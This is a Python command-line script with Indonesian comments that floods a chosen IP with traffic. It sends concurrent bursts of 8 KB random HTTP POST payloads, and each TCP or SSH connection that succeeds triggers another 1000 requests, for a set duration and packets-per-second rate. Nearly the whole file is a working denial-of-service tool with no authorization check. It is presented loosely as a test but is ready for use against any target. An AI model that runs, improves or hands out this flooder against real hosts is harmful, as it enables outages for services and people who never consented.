import asyncio
import aiohttp
import socket
import argparse
import sys
import time
import random
import string
from concurrent.futures import ThreadPoolExecutor

# Fungsi untuk mengirimkan request HTTP asinkron ke IP target pada port tertentu dengan payload lebih besar
async def send_http_request(session, ip, port):
    url = f"http://{ip}:{port}/"
    payload = ''.join(random.choices(string.ascii_letters + string.digits, k=8192))  # Membuat payload acak lebih besar
    try:
        async with session.post(url, data=payload) as response:
            status = response.status
            print(f"Sent HTTP request to {ip}:{port} - Status Code: {status}")
    except Exception as e:
        print(f"Error sending HTTP request to {ip}:{port} - {e}")

# Fungsi untuk mengirimkan request SSH menggunakan socket dengan pengujian lebih intensif
def send_ssh_request(ip, port):
    try:
        with socket.create_connection((ip, port), timeout=2) as sock:
            print(f"Successfully connected to SSH on {ip}:{port}")
            # Setelah terhubung, langsung kirimkan banyak request HTTP dengan cepat
            loop = asyncio.get_event_loop()
            loop.run_until_complete(flood_http_requests(ip, port))
    except Exception as e:
        print(f"Error connecting to SSH on {ip}:{port} - {e}")

# Fungsi untuk mengirimkan request TCP pada port tertentu
def send_tcp_request(ip, port):
    try:
        with socket.create_connection((ip, port), timeout=2) as sock:
            print(f"Successfully connected to TCP port {port} on {ip}")
            # Setelah terhubung, langsung kirimkan banyak request HTTP dengan cepat
            loop = asyncio.get_event_loop()
            loop.run_until_complete(flood_http_requests(ip, port))
    except Exception as e:
        print(f"Error connecting to TCP port {port} on {ip} - {e}")

# Fungsi untuk melakukan flooding HTTP request
async def flood_http_requests(ip, port):
    timeout = aiohttp.ClientTimeout(total=5)  # Timeout untuk setiap request
    conn = aiohttp.TCPConnector(limit_per_host=1000)  # Sesuaikan dengan kebutuhan RPS
    async with aiohttp.ClientSession(connector=conn, timeout=timeout) as session:
        tasks = []
        for _ in range(1000):  # Mengirimkan 1000 request sekaligus
            tasks.append(send_http_request(session, ip, port))
        await asyncio.gather(*tasks)

# Menampilkan himbauan tentang port
def print_port_warnings():
    print("Himbauan:")
    print("Port 80: Digunakan untuk HTTP (Hypertext Transfer Protocol). Port ini digunakan untuk mengakses situs web tanpa enkripsi.")
    print("Port 22: Digunakan untuk SSH (Secure Shell). Port ini memungkinkan akses jarak jauh yang aman ke server, login, dan transfer file.")
    print("Port 53: Digunakan untuk DNS (Domain Name System). Port ini menerjemahkan nama domain seperti www.example.com menjadi alamat IP numerik.")
    print("Port 6030: Port TCP yang dapat digunakan untuk berbagai aplikasi atau layanan khusus.")

# Fungsi utama untuk mengatur pengiriman request
async def main(ip, ports, pps, duration):
    timeout = aiohttp.ClientTimeout(total=5)  # Timeout untuk setiap request
    conn = aiohttp.TCPConnector(limit_per_host=pps * len(ports) * 5)  # Meningkatkan batas koneksi per host

    async with aiohttp.ClientSession(connector=conn, timeout=timeout) as session:
        end_time = time.time() + duration
        loop = asyncio.get_event_loop()
        with ThreadPoolExecutor(max_workers=pps * len(ports)) as executor:
            while time.time() < end_time:
                tasks = []
                for port in ports:
                    if port == 80 or port == 443:  # HTTP/HTTPS
                        for _ in range(pps):
                            tasks.append(send_http_request(session, ip, port))
                    elif port == 22:  # SSH
                        for _ in range(pps):
                            tasks.append(loop.run_in_executor(executor, send_ssh_request, ip, port))
                    elif port == 53:  # DNS
                        # Tambahkan pengujian DNS jika diperlukan
                        pass
                    elif port == 6030:  # Port TCP 6030
                        for _ in range(pps):
                            tasks.append(loop.run_in_executor(executor, send_tcp_request, ip, port))
                await asyncio.gather(*tasks)
                # await asyncio.sleep(0.01)  # Mengurangi waktu tidur untuk meningkatkan frekuensi pengujian

    print(f"Success: Requests sent to {ip} for ports {', '.join(map(str, ports))}")

# Fungsi untuk parsing argumen dari baris perintah
def parse_args():
    parser = argparse.ArgumentParser(description="Send asynchronous requests to a target IP.")
    parser.add_argument('ip', type=str, help="Target IP address")
    parser.add_argument('ports', type=str, help="Comma-separated list of ports")
    parser.add_argument('pps', type=int, help="Packets per second per port")
    parser.add_argument('duration', type=int, help="Duration of the test in seconds")
    args = parser.parse_args()
    
    # Parsing port numbers dari string
    ports = [int(port) for port in args.ports.split(',')]
    
    return args.ip, ports, args.pps, args.duration

# Menampilkan pesan penggunaan jika argumen tidak sesuai
if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("Usage: python namefile.py <ip> <ports> <pps> <duration>")
        print("Example: python namefile.py 192.168.1.1 80,22,53,6030 100 10")
        sys.exit(1)
    
    print_port_warnings()
    
    ip, ports, pps, duration = parse_args()
    asyncio.run(main(ip, ports, pps, duration))
